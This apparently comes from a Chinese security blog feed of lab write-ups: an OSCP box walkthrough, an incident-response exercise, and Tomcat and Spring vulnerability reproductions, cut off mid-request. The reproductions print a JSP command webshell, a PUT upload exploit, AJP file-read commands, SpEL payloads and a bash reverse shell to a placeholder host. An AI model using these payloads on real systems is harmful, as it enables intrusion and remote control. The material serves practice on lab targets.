alt="image-20240528143522608"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—CyberSploit2</title>
      <link href="/2024/05/27/OSCP-cybersploit-2/"/>
      <url>/2024/05/27/OSCP-cybersploit-2/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—CyberSploit2"><a href="#OSCP系列靶机—CyberSploit2" class="headerlink" title="OSCP系列靶机—CyberSploit2"></a>OSCP系列靶机—CyberSploit2</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-cybersploit-2/image-20240527140325772.png" alt="image-20240527140325772"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.55</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit-2/image-20240527140404327.png" alt="image-20240527140404327"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-cybersploit-2/image-20240527140703535.png" alt="image-20240527140703535"></p><h3 id="3、服务版本识别"><a href="#3、服务版本识别" class="headerlink" title="3、服务版本识别"></a>3、服务版本识别</h3><p><img src="/img/OSCP-cybersploit-2/image-20240527140616869.png" alt="image-20240527140616869"></p><p>22端口使用OpenSSH 8.0版本，80端口使用Apache服务，推测为centos系统</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><p><img src="/img/OSCP-cybersploit-2/image-20240527140711290.png" alt="image-20240527140711290"></p><p>80端口探测到一个<code>icons</code>目录</p><h2 id="三、HTTP-信息收集"><a href="#三、HTTP-信息收集" class="headerlink" title="三、HTTP 信息收集"></a>三、HTTP 信息收集</h2><h3 id="1、首页"><a href="#1、首页" class="headerlink" title="1、首页"></a>1、首页</h3><p>首页似乎给了几个账户名和密码，收集起来</p><p><img src="/img/OSCP-cybersploit-2/image-20240527141100852.png" alt="image-20240527141100852"></p><h3 id="2、页面源代码"><a href="#2、页面源代码" class="headerlink" title="2、页面源代码"></a>2、页面源代码</h3><p>给了一个<code>ROT47</code>的提示</p><p><img src="/img/OSCP-cybersploit-2/image-20240527141305575.png" alt="image-20240527141305575"></p><p>推测账号密码中<code>D92:=6?5C2 4J36CDA=@:E</code>是一组被编码的数值，解码成功</p><p><img src="/img/OSCP-cybersploit-2/image-20240527141614118.png" alt="image-20240527141614118"></p><h2 id="四、获取SHELL"><a href="#四、获取SHELL" class="headerlink" title="四、获取SHELL"></a>四、获取SHELL</h2><p>对收集的账号密码做成字典，进行ssh爆破</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142240215.png" alt="image-20240527142240215"></p><p>成功获取<code>shailendra</code>用户的权限</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142537822.png" alt="image-20240527142537822"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、查看-etc-passwd"><a href="#1、查看-etc-passwd" class="headerlink" title="1、查看&#x2F;etc&#x2F;passwd"></a>1、查看&#x2F;etc&#x2F;passwd</h3><p>除了<code>shailendra</code>用户之外，还存在一个<code>centos</code>用户</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142634078.png" alt="image-20240527142634078"></p><h3 id="2、hint-txt"><a href="#2、hint-txt" class="headerlink" title="2、hint.txt"></a>2、hint.txt</h3><p>这个提示给的是深处docker当中吗</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142719157.png" alt="image-20240527142719157"></p><p>查看根目录下是否有<code>.dockerenv</code>文件</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142922493.png" alt="image-20240527142922493"></p><p>虽然并未身处docker当中，但是这个机器却有docker环境，甚至还有几个容器存在</p><p><img src="/img/OSCP-cybersploit-2/image-20240527143037623.png" alt="image-20240527143037623"></p><h3 id="3、提权至root"><a href="#3、提权至root" class="headerlink" title="3、提权至root"></a>3、提权至root</h3><p>直接利用docker一句话提权</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急靶场】WinServer 2008近源应急OS-1</title>
      <link href="/2024/05/26/Emergency-Nearsource-os-1/"/>
      <url>/2024/05/26/Emergency-Nearsource-os-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-2008近源应急OS-1"><a href="#Windows-Server-2008近源应急OS-1" class="headerlink" title="Windows Server 2008近源应急OS-1"></a>Windows Server 2008近源应急OS-1</h1><p><strong>前景需要：</strong>小王从某安全大厂被优化掉后，来到了某私立小学当起了计算机老师。某一天上课的时候，发现鼠标在自己动弹，又发现除了某台电脑，其他电脑连不上网络。感觉肯定有学生捣乱，于是开启了应急。</p><ol><li>攻击者的外网IP地址</li><li>攻击者的内网跳板IP地址</li><li>攻击者使用的限速软件的md5大写</li><li>攻击者的后门md5大写</li><li>攻击者留下的flag</li></ol><h2 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h2><p>在网盘中下载该靶场，解压后在vm中选择【扫描虚拟机】，选择对应的文件夹打开即可</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240524195332592.png" alt="image-20240524195332592"></p><h2 id="二、攻击者的外网IP地址"><a href="#二、攻击者的外网IP地址" class="headerlink" title="二、攻击者的外网IP地址"></a>二、攻击者的外网IP地址</h2><p>这是一个被近源的主机，因此可能想到的是被钓鱼了</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526160712317.png" alt="image-20240526160712317"></p><p>作为一名老师，桌面上的<code>学校放假通知.doc</code>确是诱惑的一批</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162025296.png" alt="image-20240526162025296"></p><p>在沙箱中跑一下，出来外网IP</p><h2 id="三、攻击者的内网跳板IP地址"><a href="#三、攻击者的内网跳板IP地址" class="headerlink" title="三、攻击者的内网跳板IP地址"></a>三、攻击者的内网跳板IP地址</h2><p>桌面上存在一个phpstudy 修复的bat 文件，但是其目标居然是另一个bat</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162233825.png" alt="image-20240526162233825"></p><p>找到其位置居然啥也没有，打开如下两个选项</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162450318.png" alt="image-20240526162450318"></p><p>查看其内容，内网IP<code>192.168.20.129</code>，端口801</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162521917.png" alt="image-20240526162521917"></p><h2 id="四、攻击者使用的限速软件的md5大写"><a href="#四、攻击者使用的限速软件的md5大写" class="headerlink" title="四、攻击者使用的限速软件的md5大写"></a>四、攻击者使用的限速软件的md5大写</h2><p>在如下的位置</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162731280.png" alt="image-20240526162731280"></p><p>对该工具的简述：限制别人网速</p><img src="/img/Emergency-Nearsource-os-1/image-20240526162814273.png" alt="image-20240526162814273" style="zoom:150%;" /><p>在线网站计算给工具的MD5，后面转成大写即可</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162934033.png" alt="image-20240526162934033"></p><h2 id="五、攻击者的后门md5大写"><a href="#五、攻击者的后门md5大写" class="headerlink" title="五、攻击者的后门md5大写"></a>五、攻击者的后门md5大写</h2><p>这个后门本以为是文件后门，原来是五次shift 的后门</p><p>五次shfit 后门原理是替换<code>C:\windows\system32\sethc.exe</code> 文件，取该文件的md5大写即可</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526163930460.png" alt="image-20240526163930460"></p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526163955586.png" alt="image-20240526163955586"></p><h2 id="六、攻击者留下的flag"><a href="#六、攻击者留下的flag" class="headerlink" title="六、攻击者留下的flag"></a>六、攻击者留下的flag</h2><p>即五次shift 之后出现的flag</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526163508759.png" alt="image-20240526163508759"></p><h2 id="七、解题"><a href="#七、解题" class="headerlink" title="七、解题"></a>七、解题</h2><img src="/img/Emergency-Nearsource-os-1/image-20240526164326272.png" alt="image-20240526164326272" style="zoom:150%;" />]]></content>
      
      
      <categories>
          
          <category> 应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Tomcat 系列漏洞复现</title>
      <link href="/2024/05/24/VulnRep-Tomcat/"/>
      <url>/2024/05/24/VulnRep-Tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】Tomcat-系列漏洞复现"><a href="#【漏洞复现】Tomcat-系列漏洞复现" class="headerlink" title="【漏洞复现】Tomcat 系列漏洞复现"></a>【漏洞复现】Tomcat 系列漏洞复现</h1><h2 id="一、任意文件上传（tomcat8）"><a href="#一、任意文件上传（tomcat8）" class="headerlink" title="一、任意文件上传（tomcat8）"></a>一、任意文件上传（tomcat8）</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。Tomcat7+权限分为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- manager（后台管理）</span><br><span class="line">  - manager-gui 拥有html页面权限</span><br><span class="line">  - manager-status 拥有查看status的权限</span><br><span class="line">  - manager-script 拥有text接口的权限，和status权限</span><br><span class="line">  - manager-jmx 拥有jmx权限，和status权限</span><br><span class="line">- host-manager（虚拟主机管理）</span><br><span class="line">  - admin-gui 拥有html页面权限</span><br><span class="line">  - admin-script 拥有text接口权限</span><br></pre></td></tr></table></figure><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手动修改了这些属性的情况下，才可以进行攻击。</p><h3 id="2、漏洞复现"><a href="#2、漏洞复现" class="headerlink" title="2、漏洞复现"></a>2、漏洞复现</h3><p>1、弱口令<code>tomcat:tomcat</code>访问后台</p><p><img src="/img/VulnRep-Tomcat/image-20240524144345487.png" alt="image-20240524144345487"></p><p>2、上传webshell</p><p>将如下shell.jsp 压缩成zip，再修改后缀为war</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;pre&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;/pre&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Tomcat/image-20240524144716290.png" alt="image-20240524144716290"></p><p>3、执行命令</p><p><img src="/img/VulnRep-Tomcat/image-20240524144805697.png" alt="image-20240524144805697"></p><h2 id="二、PUT方法写入任意文件（CVE-2017-12615）"><a href="#二、PUT方法写入任意文件（CVE-2017-12615）" class="headerlink" title="二、PUT方法写入任意文件（CVE-2017-12615）"></a>二、PUT方法写入任意文件（CVE-2017-12615）</h2><h3 id="1、漏洞原因-1"><a href="#1、漏洞原因-1" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>该版本Tomcat配置了可写（readonly&#x3D;false），导致我们可以往服务器写文件</p><h3 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Apache Tomcat 7.0.0 - 7.0.81</p><h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Tomcat/image-20240524145153634.png" alt="image-20240524145153634"></p><p>2、抓包修改请求为PUT</p><p>后台对文件后缀还是有一定限制的，此处利用linux特性，在文件名后缀加上&#x2F; 即可绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp/ HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:xxxx</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;pre&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;/pre&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Tomcat/image-20240524145600653.png" alt="image-20240524145600653"></p><p>3、执行命令</p><p><img src="/img/VulnRep-Tomcat/image-20240524145644511.png" alt="image-20240524145644511"></p><h2 id="三、文件包含漏洞（CVE-2020-1938）"><a href="#三、文件包含漏洞（CVE-2020-1938）" class="headerlink" title="三、文件包含漏洞（CVE-2020-1938）"></a>三、文件包含漏洞（CVE-2020-1938）</h2><h3 id="1、漏洞原因-2"><a href="#1、漏洞原因-2" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Tomcat默认开启AJP服务（8009端口），存在一处文件包含缺陷。攻击者可以通过构造的恶意请求包来进行文件包含操作，从而读取或包含Tomcat上所有webapp目录下的任意文件，如：webapp配置文件或源代码等。如果此时还存在文件上传功能，则可能会导致代码执行。</p><p>tomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p><h3 id="2、影响版本-1"><a href="#2、影响版本-1" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><p>不受影响版本：</p><ul><li>Apache Tomcat 7.0.10034</li><li>Apache Tomcat 8.5.5134</li><li>Apache Tomcat 9.0.3134</li></ul><h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、可用nmap 扫这两个端口</p><p><img src="/img/VulnRep-Tomcat/image-20240524151619712.png" alt="image-20240524151619712"></p><p>2、漏洞复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">cd CNVD-2020-10487-Tomcat-Ajp-lfi/</span><br><span class="line">chmod +x CNVD-2020-10487-Tomcat-Ajp-lfi.py</span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.9 -p 8009 -f WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Tomcat/image-20240524152014946.png" alt="image-20240524152014946"></p><p>此靶场无文件上传的功能，可以手动进入容器中写入一个webshell，之后包含，即可getshell。</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【基础知识】Java相关名词</title>
      <link href="/2024/05/23/Nouns-Java/"/>
      <url>/2024/05/23/Nouns-Java/</url>
      
        <content type="html"><![CDATA[<h1 id="Java相关名词"><a href="#Java相关名词" class="headerlink" title="Java相关名词"></a>Java相关名词</h1><h2 id="一、Java-开发名词"><a href="#一、Java-开发名词" class="headerlink" title="一、Java 开发名词"></a>一、Java 开发名词</h2><p>Java 2 标准版（J2SE） 桌面，java基础及其核心，主要开发桌面程序或控制程序。</p><p>Java 2 移动版（J2ME）移动端、手机，嵌入式开发。</p><p>Java 2 企业版（J2EE）企业版、服务器，web端开发。</p><h2 id="二、Java-跨平台"><a href="#二、Java-跨平台" class="headerlink" title="二、Java 跨平台"></a>二、Java 跨平台</h2><p>JVM : 实现真正的可移植性，只要安装了JVM的地方都可以运行Java程序。</p><h2 id="三、Java-工具"><a href="#三、Java-工具" class="headerlink" title="三、Java 工具"></a>三、Java 工具</h2><p>构建工具：Maven、Jekins、Ant</p><p>应用服务器：Tomcat、Jetty、Jboss、Websphere、Weblogic</p><p>Web开发：struts2、spring、myBatis</p><p>Hadoop 大数据领域 、Android 手机端</p><p>Java动态性–&gt;反射 ，大多框架基本都基于反射</p><p>JDK :Java Development Kit Java开发者工具</p><p>JRE: Java Runtime Environment Java运行环境</p><p>JVM : Java Virtual Machine Java虚拟机</p><p>JDK包含JRE包含JVM。Java、Javac编译运行Java程序，Javadoc可以生成doc文档，jar可以生成.jar的应用程序。</p><p>运行Java程序需要JRE环境，程序运行时会在JVM中运行，所以实现了Java的可移植性。java类初始化的时候调用java.lang.ClassLoader加载字节码文件。</p><h2 id="四、JDK-的目录"><a href="#四、JDK-的目录" class="headerlink" title="四、JDK 的目录"></a>四、JDK 的目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bin : 存放Java运行工具，如javac.exe、jar.exe</span><br><span class="line">inclue : 因为Java是c、c++语言编写的，这里存放了很多需要引用的c库</span><br><span class="line">jre : Java运行所需环境，包含JVM</span><br><span class="line">lib : Java类库</span><br><span class="line">src.zip : 资源文件，放了很多Java类的源代码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Spring 系列漏洞复现（全漏洞版本）</title>
      <link href="/2024/05/23/VulnRep-Spring/"/>
      <url>/2024/05/23/VulnRep-Spring/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】Spring-系列漏洞复现（全漏洞版本）"><a href="#【漏洞复现】Spring-系列漏洞复现（全漏洞版本）" class="headerlink" title="【漏洞复现】Spring 系列漏洞复现（全漏洞版本）"></a>【漏洞复现】Spring 系列漏洞复现（全漏洞版本）</h1><h2 id="零、Spring-框架简介"><a href="#零、Spring-框架简介" class="headerlink" title="零、Spring 框架简介"></a>零、Spring 框架简介</h2><p>Spring 是一个开源的Java 平台，用于企业级Java 应用开发。Spring 框架因其灵活性、易用性和强大的社区支持而广受好评，是构建企业级Java 应用的首选框架之一。</p><h2 id="一、Spring-Security-OAuth2-远程代码执行RCE漏洞（CVE-2016-4977）"><a href="#一、Spring-Security-OAuth2-远程代码执行RCE漏洞（CVE-2016-4977）" class="headerlink" title="一、Spring Security OAuth2 远程代码执行RCE漏洞（CVE-2016-4977）"></a>一、Spring Security OAuth2 远程代码执行RCE漏洞（CVE-2016-4977）</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Security OAuth2 是Spring框架中提供安全认证支持的一个模块。在处理请求过程中如果使用了whitelabel视图，response_type参数值会被当做Spring SpEL来执行，进而造成SpEL注入。攻击者通过构造<code>response_type</code>值可以触发远程代码执行漏洞。</p><h3 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Security OAuth 2.0到2.0.14</li><li>Spring Security OAuth 2.1到2.1.1</li><li>Spring Security OAuth 2.2到2.2.1</li><li>Spring Security OAuth 2.3到2.3.2</li></ul><h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、靶场首页</p><p><img src="/img/VulnRep-Spring/image-20240521173035003.png" alt="image-20240521173035003"></p><p>2、访问<code>/oauth/authorized</code></p><p>默认账号密码：<code>admin:admin</code></p><p><img src="/img/VulnRep-Spring/image-20240521174542972.png" alt="image-20240521174542972"></p><p>3、添加请求参数response_type</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/oauth/authorize?response_type=$&#123;2*3&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240521174848661.png" alt="image-20240521174848661"></p><p>4、上POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">message = input(&#x27;Enter message to encode:&#x27;)</span><br><span class="line">poc = &#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27; % ord(message[0])</span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   poc += &#x27;.concat(T(java.lang.Character).toString(%s))&#x27; % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += &#x27;)&#125;&#x27;</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240521175616193.png" alt="image-20240521175616193"></p><h2 id="二、Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）"><a href="#二、Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="headerlink" title="二、Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）"></a>二、Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h2><h3 id="1、漏洞原因-1"><a href="#1、漏洞原因-1" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><p>在订阅酒店功能处，存在一个命令执行，直接调用了两个函数，这两个函数，一个是：addDefaultMappings ,一个是 addModelBindings。其中，直接控制field这个值的函数是addDefaultMappings，且未做过滤，而addModelBindings是直接获取的java的一个配置文件，由配置文件来确定是否有 binder 节点，如果有，就无法触发代码执行。</p><p>所以漏洞条件有两个：</p><ol><li>binder节点为空；</li><li>useSpringBeanBinding 默认值（false）未修改。</li></ol><h3 id="2、影响版本-1"><a href="#2、影响版本-1" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Spring WebFlow 2.4.0 - 2.4.4</p><h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Spring/image-20240522134021757.png" alt="image-20240522134021757"></p><p>2、点击左上角进行登陆</p><p>用给的账号密码进行登陆</p><p><img src="/img/VulnRep-Spring/image-20240522134136178.png" alt="image-20240522134136178"></p><p>3、访问<code>hotels/1</code> 的酒店</p><p><img src="/img/VulnRep-Spring/image-20240522134433756.png" alt="image-20240522134433756"></p><p><img src="/img/VulnRep-Spring/image-20240522134552636.png" alt="image-20240522134552636"></p><p>抓包<code>Confirm</code>的POST请求。由于是存在token 的，所以这里使用重放是无法复现的，需要现抓改包</p><p><img src="/img/VulnRep-Spring/image-20240522134638988.png" alt="image-20240522134638988"></p><p>4、上POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//1、创建文件</span><br><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;touch&quot;,&quot;/tmp/1.txt&quot;)).start()=vulhub</span><br><span class="line"></span><br><span class="line">//2、反弹shell</span><br><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/x.x.x.x/4444+0&gt;%261&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240522135429106.png" alt="image-20240522135429106"></p><p>进容器查看</p><p><img src="/img/VulnRep-Spring/image-20240522135555083.png" alt="image-20240522135555083"></p><h2 id="三、Spring-Data-Rest-远程命令执行漏洞（CVE-2017-8046）"><a href="#三、Spring-Data-Rest-远程命令执行漏洞（CVE-2017-8046）" class="headerlink" title="三、Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）"></a>三、Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）</h2><h3 id="1、漏洞原因-2"><a href="#1、漏洞原因-2" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Data REST 服务器在处理 PATCH 请求时，攻击者可以构造恶意的 JSON 格式的 PATCH 请求并发送给spring-date-rest 服务器，来执行恶意的Java代码。</p><h3 id="2、影响版本-2"><a href="#2、影响版本-2" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Data REST 版本 &lt; 2.5.12、 2.6.7、 3.0 RC3</li><li>Spring Boot 版本 &lt; 2.0.0M4</li><li>Spring Data release trains Kay-RC3 之前的版本</li></ul><h3 id="3、漏洞复现-2"><a href="#3、漏洞复现-2" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Spring/image-20240522142110867.png" alt="image-20240522142110867"></p><p>2、漏洞点在<code>/customers/1</code></p><p><img src="/img/VulnRep-Spring/image-20240522142308657.png" alt="image-20240522142308657"></p><p>3、抓包上POC</p><p>需要把要执行的命令转成ASCII，这里借助python脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Payload to ASCII</span><br><span class="line">payload = b&#x27;touch /tmp/shell.txt&#x27;</span><br><span class="line">bytecode = &#x27;,&#x27;.join(str(i) for i in list(payload))</span><br><span class="line">print(bytecode)</span><br></pre></td></tr></table></figure><p>修改数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PATCH /customers/1 HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: 